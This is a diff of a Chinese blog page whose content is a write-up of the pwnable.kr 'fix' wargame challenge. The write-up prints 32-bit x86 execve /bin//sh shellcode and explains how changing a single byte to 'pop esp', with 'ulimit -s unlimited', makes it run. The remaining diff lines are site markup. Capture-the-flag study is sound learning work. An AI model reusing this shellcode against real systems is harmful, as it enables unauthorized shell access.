@@ -1,7 +1,7 @@
 
 
 <!doctype html>
-<html lang="en" class="no-js">
+<html lang="en" class="no-js" data-local-preview="false">
   <head>
     
       <meta charset="utf-8">
@@ -213,7 +213,7 @@
 
   
 
-<div data-shared-navigation="../../../../../navigation/shared/group-2-d7abe878c55d.html" data-site-root="../../../../../" aria-busy="true">
+<div data-shared-navigation="../../../../../navigation/shared/group-2-311df939f8c9.html" data-site-root="../../../../../" aria-busy="true">
   <a href="../../../../..">加载栏目目录…</a>
 </div>
 <script src="../../../../../javascripts/shared-navigation.js"></script>
@@ -250,7 +250,7 @@
       
     
     <div class="md-container" data-md-component="container"
-         data-shared-navigation-target="../../../../../navigation/shared/group-2-d7abe878c55d.html"
+         data-shared-navigation-target="../../../../../navigation/shared/group-2-311df939f8c9.html"
          data-site-root="../../../../../"
          data-navigation-hidden="false">
       
@@ -660,10 +660,20 @@
   
 
 
+<!-- blog-edit-start:1841fdd49928e660:b0 -->
+
 <h1 id="pwnable-kr-fix">Pwnable kr fix 题解</h1>
+<!-- blog-edit-end:1841fdd49928e660:b0 -->
+
 <div class="file-actions" data-image-edit-revision="1841fdd49928e6604ca52c4dbea7fe6a668f87dee16012b400ff1696366ddd76" data-title-link="true"><a href="blog-edit://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cpwnable_kr%5Cnote%5C30.fix.md" class="file-action-link" title="使用本地应用打开源文件">本地编辑</a> | <a href="blog-folder://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cpwnable_kr%5Cnote" class="file-action-link" title="使用文件资源管理器打开源文件所在目录">打开本地目录</a> | <span class="file-action-link" style="cursor: pointer;" data-copy="D:\Blog\done\系统性知识\信息安全\pwnable_kr\note\30.fix.md">复制路径</span></div>
 
+<!-- blog-edit-start:1841fdd49928e660:b1 -->
+
 <p>要求: 修改下面的 shellcode, 只修改一个字节使其可以成功执行.</p>
+<!-- blog-edit-end:1841fdd49928e660:b1 -->
+
+<!-- blog-edit-start:1841fdd49928e660:b2 -->
+
 <div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><span class="linenos" data-linenos=" 1 "></span>0 xor    %eax,%eax
 </span><span id="__span-0-2"><span class="linenos" data-linenos=" 2 "></span>1 push   %eax
 </span><span id="__span-0-3"><span class="linenos" data-linenos=" 3 "></span>2 push   0x68732f2f #/bin//sh 
@@ -675,9 +685,25 @@
 </span><span id="__span-0-9"><span class="linenos" data-linenos=" 9 "></span>8 mov    %al, 0xb
 </span><span id="__span-0-10"><span class="linenos" data-linenos="10 "></span>9 int    0x80
 </span></code></pre></div>
+<!-- blog-edit-end:1841fdd49928e660:b2 -->
+
+<!-- blog-edit-start:1841fdd49928e660:b3 -->
+
 <p>PS: <code>/bin//sh</code> 没有问题, 无论多少个 <code>/</code> 都可以</p>
+<!-- blog-edit-end:1841fdd49928e660:b3 -->
+
+<!-- blog-edit-start:1841fdd49928e660:b4 -->
+
 <h2 id="_1">错误做法</h2>
+<!-- blog-edit-end:1841fdd49928e660:b4 -->
+
+<!-- blog-edit-start:1841fdd49928e660:b5 -->
+
 <p>有几种方式是不可以的：</p>
+<!-- blog-edit-end:1841fdd49928e660:b5 -->
+
+<!-- blog-edit-start:1841fdd49928e660:b6 -->
+
 <ol>
 <li>
 <p>Line 5: push %eax → leave</p>
@@ -697,10 +723,29 @@
 <p>Line 1: push %eax → leave</p>
 </li>
 </ol>
+<!-- blog-edit-end:1841fdd49928e660:b10 -->
+
+<!-- blog-edit-start:1841fdd49928e660:b11 -->
+
 <p>明确 <code>ebx</code> 是 <code>char*</code>，按照正常来说，应该是<code>'/bin//sh\0'</code>。</p>
+<!-- blog-edit-end:1841fdd49928e660:b11 -->
+
+<!-- blog-edit-start:1841fdd49928e660:b12 -->
+
 <p>原来的<code>push %eax</code>相当于<code>push 0</code>，所以 <code>/bin//sh</code> 下面是0，但你改成<code>leave</code>，下面不是0，他就要根据下面存的东西去寻址，显然失败。</p>
+<!-- blog-edit-end:1841fdd49928e660:b12 -->
+
+<!-- blog-edit-start:1841fdd49928e660:b13 -->
+
 <h2 id="_2">正确的做法</h2>
+<!-- blog-edit-end:1841fdd49928e660:b13 -->
+<!-- blog-edit-start:1841fdd49928e660:b14 -->
+
 <p>Line 5: push %eax → pop esp</p>
+<!-- blog-edit-end:1841fdd49928e660:b14 -->
+
+<!-- blog-edit-start:1841fdd49928e660:b15 -->
+
 <div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><span class="linenos" data-linenos=" 1 "></span>0 xor    %eax,%eax
 </span><span id="__span-1-2"><span class="linenos" data-linenos=" 2 "></span>1 push   %eax
 </span><span id="__span-1-3"><span class="linenos" data-linenos=" 3 "></span>2 push   0x68732f2f #/bin//sh 
@@ -712,7 +757,15 @@
 </span><span id="__span-1-9"><span class="linenos" data-linenos=" 9 "></span>8 mov    %al, 0xb
 </span><span id="__span-1-10"><span class="linenos" data-linenos="10 "></span>9 int    0x80
 </span></code></pre></div>
+<!-- blog-edit-end:1841fdd49928e660:b15 -->
+
+<!-- blog-edit-start:1841fdd49928e660:b16 -->
+
 <p>前提是需要执行 <code>ulimit -s unlimited</code>，允许 <code>esp</code> 变成 <code>0x6e69622f</code> 这种值。</p>
+<!-- blog-edit-end:1841fdd49928e660:b16 -->
+
+<!-- blog-edit-start:1841fdd49928e660:b17 -->
+
 <ol>
 <li>
 <p>第一个问题：<code>pop esp</code> 后，<code>ebx</code> 还是指向 <code>/bin</code> 吗？<code>/bin</code> 已经被 pop 到 <code>esp</code> 了，为什么 <code>ebx</code> 指向的还是<code>/bin</code>？</p>
@@ -726,7 +779,14 @@
 <p>第二个问题：这个和错误做法 1 有什么不同？</p>
 </li>
 </ol>
+<!-- blog-edit-end:1841fdd49928e660:b19 -->
+
+<!-- blog-edit-start:1841fdd49928e660:b20 -->
+
 <p>改变后的<code>esp</code>是<code>0x6e69622f</code>，在<code>gdb</code>中调试，可以看到<code>0x6e69622f</code>及其后面几个都是0，所以错误做法 1 的错误原因可以规避掉。</p>
+<!-- blog-edit-end:1841fdd49928e660:b20 -->
+
+<div hidden data-text-edit-source="D:\Blog\done\系统性知识\信息安全\pwnable_kr\note\30.fix.md" data-text-edit-revision="1841fdd49928e6604ca52c4dbea7fe6a668f87dee16012b400ff1696366ddd76" data-text-edit-marker="1841fdd49928e660" data-text-edit-schema="1"></div>
 
 
 
@@ -958,8 +1018,6 @@
         <script src="../../../../../javascripts/resizable-sidebar.js"></script>
       
         <script src="../../../../../javascripts/sidebar-toggle-buttons.js"></script>
-      
-        <script src="../../../../../javascripts/review-tracker.js"></script>
       
         <script src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
       
